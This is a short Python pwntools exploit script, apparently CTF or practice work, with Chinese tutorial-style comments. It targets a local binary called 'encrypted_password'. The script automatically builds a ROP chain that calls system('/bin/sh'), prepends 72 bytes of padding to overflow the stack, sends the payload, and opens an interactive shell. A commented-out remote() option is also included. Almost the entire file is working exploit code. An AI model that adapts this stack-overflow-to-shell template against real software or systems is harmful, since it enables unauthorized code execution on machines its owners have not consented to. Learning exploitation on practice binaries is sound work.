#!/usr/bin/env python3
from pwn import *
from pwn import ELF, ROP, context, log, process, remote

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"
context.timeout = 5
binary = "/home/kita/Downloads/encrypted_password"

HOST = "127.0.0.1"
PORT = 9999

elf = ELF(binary)

# p = remote(HOST, PORT)
p = process(binary)

# 4. 自动化构建 ROP 链
# 告别手动执行 ROPgadget，pwntools 就是你的 pacman
rop = ROP(elf)

# 方法 A：最高级的自动化 (Auto-magic)
# 你甚至不需要知道 pop rdi 在哪，直接告诉它你想调用什么，它自动找 Gadget！
rop.system(next(elf.search(b"/bin/sh\x00")))

# 方法 B：半自动化的精细控制 (The Arch Way)
# 如果你想自己掌控每一个步骤，可以这样写：
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# binsh = next(elf.search(b'/bin/sh\x00'))
# rop.raw(pop_rdi)               # 塞入 gadget
# rop.raw(binsh)                 # 塞入参数
# rop.raw(elf.symbols['system']) # 塞入函数调用

# 5. 打印出你优雅的 ROP 链
# 就像运行 neofetch 欣赏你的系统配置一样，看看自动生成的 payload
log.info("My beautiful ROP chain:\n" + rop.dump())


# 6. 计算 Padding 偏移量
# 假设你通过 gdb 或 pwntools 的 cyclic() 算出了溢出点在 72 字节之后
padding = b"A" * 72

# 7. 组装最终的 Payload
# rop.chain() 会自动把你上面的配置序列化为 bytes，不用自己写 p64()
payload = padding + rop.chain()

# recv
p.recvuntil(b"> ")
# p.recvall()


p.sendline(payload)

p.interactive()
